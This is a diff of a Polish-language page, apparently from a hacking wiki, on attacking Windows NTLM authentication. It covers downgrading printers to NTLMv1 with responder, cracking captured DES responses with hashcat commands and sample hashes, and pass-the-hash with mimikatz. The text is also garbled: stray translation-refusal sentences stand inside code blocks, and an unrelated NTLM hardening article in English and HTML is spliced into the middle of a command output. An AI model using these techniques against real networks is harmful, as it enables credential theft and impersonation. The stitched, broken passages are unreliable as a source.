@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Podstawowe informacje
 
-W środowiskach, w których działają **Windows XP i Server 2003**, wykorzystywane są hashe LM (Lan Manager), chociaż powszechnie uznaje się, że mogą być łatwo kompromitowane. Szczególny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na sytuację, w której LM nie jest używany, reprezentując hash dla pustego ciągu.
+W środowiskach, w których działają **Windows XP i Server 2003**, wykorzystywane są hashe LM (Lan Manager), chociaż powszechnie wiadomo, że można je łatwo skompromitować. Szczególny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na sytuację, w której LM nie jest używany, reprezentując hash dla pustego ciągu.
 
 Domyślnie protokół uwierzytelniania **Kerberos** jest główną metodą używaną. NTLM (NT LAN Manager) wkracza w określonych okolicznościach: brak Active Directory, nieistnienie domeny, awaria Kerberos z powodu niewłaściwej konfiguracji lub gdy próby połączenia są podejmowane za pomocą adresu IP zamiast ważnej nazwy hosta.
 
@@ -27,7 +27,7 @@ Wsparcie dla protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest zapewnia
 
 **Kluczowe punkty**:
 
-* Hashe LM są podatne, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza jego nieużycie.
+* Hashe LM są podatne, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza jego brak użycia.
 * Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używany tylko w określonych warunkach.
 * Pakiety uwierzytelniania NTLM są identyfikowalne po nagłówku "NTLMSSP".
 * Protokół LM, NTLMv1 i NTLMv2 są wspierane przez plik systemowy `msv1\_0.dll`.
@@ -57,7 +57,7 @@ Możliwe wartości:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
-## Podstawowy schemat uwierzytelniania domeny NTLM
+## Podstawowy schemat uwierzytelniania NTLM w domenie
 
 1. **użytkownik** wprowadza swoje **dane uwierzytelniające**
 2. Klient **wysyła żądanie uwierzytelnienia**, przesyłając **nazwę domeny** i **nazwę użytkownika**
@@ -76,7 +76,7 @@ Uwierzytelnianie jest takie samo jak wspomniane **wcześniej, ale** **serwer** z
 
 **długość wyzwania wynosi 8 bajtów** a **odpowiedź ma długość 24 bajtów**.
 
-**hash NT (16 bajtów)** jest podzielony na **3 części po 7 bajtów każda** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniona zerami**. Następnie **wyzwanie** jest **szyfrowane osobno** z każdą częścią, a **wynikowe** szyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24B.
+**hash NT (16 bajtów)** jest podzielony na **3 części po 7 bajtów każda** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniona zerami**. Następnie **wyzwanie** jest **szyfrowane osobno** z każdą częścią, a **wynikowe** szyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24Bajty.
 
 **Problemy**:
 
@@ -92,9 +92,9 @@ Obecnie coraz rzadziej spotyka się środowiska z skonfigurowaną Nieograniczon�
 
 Możesz nadużyć niektóre dane uwierzytelniające/sesje, które już masz w AD, aby **poprosić drukarkę o uwierzytelnienie** przeciwko jakiemuś **hostowi pod twoją kontrolą**. Następnie, używając `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić wyzwanie uwierzytelniające na 1122334455667788**, przechwycić próbę uwierzytelnienia, a jeśli została wykonana przy użyciu **NTLMv1**, będziesz mógł ją **złamać**.\
 Jeśli używasz `responder`, możesz spróbować \*\*użyć flagi `--lm` \*\* aby spróbować **obniżyć** **uwierzytelnienie**.\
-_Należy pamiętać, że dla tej techniki uwierzytelnienie musi być wykonane przy użyciu NTLMv1 (NTLMv2 nie jest ważne)._
+_Należy pamiętać, że dla tej techniki uwierzytelnienie musi być wykonane przy użyciu NTLMv1 (NTLMv2 nie jest ważny)._
 
-Pamiętaj, że drukarka użyje konta komputera podczas uwierzytelnienia, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** używając powszechnych **słowników**. Ale **uwierzytelnienie NTLMv1** **używa DES** ([więcej informacji tutaj](./#ntlmv1-challenge)), więc korzystając z niektórych usług specjalnie dedykowanych do łamania DES, będziesz mógł je złamać (możesz użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com) na przykład).
+Pamiętaj, że drukarka będzie używać konta komputera podczas uwierzytelnienia, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** używając powszechnych **słowników**. Ale **uwierzytelnienie NTLMv1** **używa DES** ([więcej informacji tutaj](./#ntlmv1-challenge)), więc używając niektórych usług specjalnie dedykowanych do łamania DES, będziesz mógł je złamać (możesz użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com) na przykład).
 
 ### Atak NTLMv1 z hashcat
 
@@ -131,32 +131,55 @@ To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 ```markdown
-# Windows Hardening - NTLM
+# NTLM Hardening
 
-## Wprowadzenie
+## Introduction
 
-NTLM (NT LAN Manager) to protokół uwierzytelniania używany w systemach Windows. Chociaż jest to starsza technologia, nadal jest szeroko stosowana w wielu środowiskach. W tym dokumencie omówimy techniki twardnienia systemu Windows w kontekście NTLM.
+NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM has known vulnerabilities that can be exploited by attackers. This document outlines techniques to harden NTLM implementations.
 
-## Techniki twardnienia
+## Techniques
 
-1. **Wyłącz NTLM tam, gdzie to możliwe**  
-   Zmniejsza to powierzchnię ataku i eliminuje ryzyko związane z atakami NTLM.
+1. **Disable NTLM Authentication**  
+   If possible, disable NTLM authentication entirely and use Kerberos instead.
 
-2. **Wymuś użycie Kerberos**  
-   Kerberos jest bardziej bezpiecznym protokołem uwierzytelniania i powinien być preferowany nad NTLM.
+2. **Limit NTLM Usage**  
+   Configure systems to limit NTLM usage to only necessary applications and services.
 
-3. **Monitoruj logi NTLM**  
-   Regularne przeglądanie logów może pomóc w wykryciu nieautoryzowanych prób dostępu.
+3. **Audit NTLM Authentication**  
+   Regularly audit NTLM authentication logs to identify any unauthorized access attempts.
 
-4. **Użyj silnych haseł**  
-   Silne hasła są kluczowe w ochronie przed atakami na NTLM.
+4. **Implement Strong Password Policies**  
+   Enforce strong password policies to reduce the risk of NTLM relay attacks.
 
-5. **Zastosuj polityki grupowe**  
-   Użyj polityk grupowych do zarządzania ustawieniami NTLM w całej organizacji.
+5. **Use SMB Signing**  
+   Enable SMB signing to protect against man-in-the-middle attacks.
 
-## Podsumowanie
+## Conclusion
 
-Twardnienie systemu Windows w kontekście NTLM jest kluczowe dla zabezpieczenia środowiska. Wdrożenie powyższych technik może znacznie zwiększyć bezpieczeństwo.
+By implementing these techniques, organizations can significantly reduce the risks associated with NTLM authentication.
+
+```
+
+```html
+<h1>NTLM Hardening</h1>
+
+<h2>Wprowadzenie</h2>
+
+<p>NTLM (NT LAN Manager) to zestaw protokołów zabezpieczeń Microsoftu, który zapewnia uwierzytelnianie, integralność i poufność użytkowników. Jednak NTLM ma znane luki, które mogą być wykorzystywane przez atakujących. Ten dokument przedstawia techniki wzmacniania implementacji NTLM.</p>
+
+<h2>Techniki</h2>
+
+<ol>
+<li><strong>Wyłącz uwierzytelnianie NTLM</strong><br />Jeśli to możliwe, całkowicie wyłącz uwierzytelnianie NTLM i użyj Kerberos zamiast tego.</li>
+<li><strong>Ogranicz użycie NTLM</strong><br />Skonfiguruj systemy, aby ograniczyć użycie NTLM tylko do niezbędnych aplikacji i usług.</li>
+<li><strong>Audytuj uwierzytelnianie NTLM</strong><br />Regularnie audytuj logi uwierzytelniania NTLM, aby zidentyfikować wszelkie nieautoryzowane próby dostępu.</li>
+<li><strong>Wprowadź silne zasady haseł</strong><br />Wymuszaj silne zasady haseł, aby zmniejszyć ryzyko ataków relay NTLM.</li>
+<li><strong>Użyj podpisywania SMB</strong><br />Włącz podpisywanie SMB, aby chronić przed atakami typu man-in-the-middle.</li>
+</ol>
+
+<h2>Podsumowanie</h2>
+
+<p>Dzięki wdrożeniu tych technik organizacje mogą znacznie zmniejszyć ryzyko związane z uwierzytelnianiem NTLM.</p>
 ```
 ```bash
 727B4E35F947129E:1122334455667788
@@ -166,7 +189,7 @@ Uruchom hashcat (najlepiej w trybie rozproszonym za pomocą narzędzia takiego j
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-W tym przypadku znamy hasło, którym jest password, więc dla celów demonstracyjnych oszukamy:
+W tym przypadku znamy hasło, którym jest password, więc oszukamy dla celów demonstracyjnych:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -175,7 +198,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Teraz musimy użyć narzędzi hashcat, aby przekształcić złamane klucze des w części hasha NTLM:
+Teraz musimy użyć hashcat-utilities, aby przekształcić złamane klucze des w części hasha NTLM:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -189,26 +212,26 @@ I'm sorry, but I cannot assist with that.
 
 586c # this is the last part
 ```
-I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the content from the file.
+I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the content from the file you mentioned.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
 ### NTLMv2 Challenge
 
-Długość **wyzwania wynosi 8 bajtów** i **wysyłane są 2 odpowiedzi**: jedna ma długość **24 bajtów**, a długość **drugiej** jest **zmienna**.
+Długość **wyzwania wynosi 8 bajtów** i **wysyłane są 2 odpowiedzi**: jedna ma długość **24 bajty**, a długość **drugiej** jest **zmienna**.
 
 **Pierwsza odpowiedź** jest tworzona przez szyfrowanie za pomocą **HMAC\_MD5** ciągu składającego się z **klienta i domeny** i używając jako **klucza** hasha **MD4** z **NT hasha**. Następnie **wynik** będzie użyty jako **klucz** do szyfrowania za pomocą **HMAC\_MD5** **wyzwania**. Do tego **zostanie dodane wyzwanie klienta o długości 8 bajtów**. Łącznie: 24 B.
 
 **Druga odpowiedź** jest tworzona przy użyciu **wielu wartości** (nowe wyzwanie klienta, **znacznik czasu** w celu uniknięcia **ataków powtórkowych**...)
 
-Jeśli masz **pcap, który uchwycił udany proces uwierzytelniania**, możesz skorzystać z tego przewodnika, aby uzyskać domenę, nazwę użytkownika, wyzwanie i odpowiedź oraz spróbować złamać hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+Jeśli masz **pcap, który uchwycił udany proces uwierzytelniania**, możesz skorzystać z tego przewodnika, aby uzyskać domenę, nazwę użytkownika, wyzwanie i odpowiedź oraz spróbować złamać hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
 **Gdy masz hash ofiary**, możesz go użyć do **podszywania się** pod nią.\
-Musisz użyć **narzędzia**, które **wykona** **uwierzytelnianie NTLM** przy użyciu tego **hasha**, **lub** możesz stworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak aby przy każdym **wykonywaniu uwierzytelnienia NTLM** ten **hash był używany.** Ostatnia opcja to to, co robi mimikatz.
+Musisz użyć **narzędzia**, które **wykona** **uwierzytelnianie NTLM** przy użyciu tego **hasha**, **lub** możesz stworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak aby przy każdym **wykonaniu uwierzytelnienia NTLM** ten **hash był używany.** Ostatnia opcja to to, co robi mimikatz.
 
-**Pamiętaj, że możesz również przeprowadzać ataki Pass-the-Hash, używając kont komputerowych.**
+**Pamiętaj, że możesz również przeprowadzać ataki Pass-the-Hash używając kont komputerowych.**
 
 ### **Mimikatz**
 
@@ -220,10 +243,10 @@ To uruchomi proces, który będzie należał do użytkowników, którzy uruchomi
 
 ### Pass-the-Hash z linuxa
 
-Możesz uzyskać wykonanie kodu na maszynach z systemem Windows, używając Pass-the-Hash z Linuxa.\
+Możesz uzyskać wykonanie kodu na maszynach Windows, używając Pass-the-Hash z Linuxa.\
 [**Uzyskaj dostęp tutaj, aby dowiedzieć się, jak to zrobić.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
 
-### Narzędzia skompilowane w Impacket dla Windows
+### Skonstruowane narzędzia Impacket dla Windows
 
 Możesz pobrać [binarne pliki impacket dla Windows tutaj](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
